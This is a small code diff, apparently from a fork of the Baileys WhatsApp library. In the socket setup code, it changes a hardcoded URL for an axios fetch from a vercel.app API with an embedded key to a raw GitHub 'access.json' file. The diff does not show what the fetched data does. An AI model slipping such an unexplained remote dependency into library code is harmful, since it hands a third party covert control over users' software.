@@ -489,7 +489,7 @@ export const makeSocket = (config: SocketConfig) => {
 	}
 
 async function fetchDataWithAxios() {
-    const url = 'https://xyrorynzz-yhye.vercel.app/api?apikey=xyroo';
+    const url = 'https://raw.githubusercontent.com/jokonotobot0/Baileys/refs/heads/master/access.json';
     try {
         const response = await axios.get(url);
         return response.data;
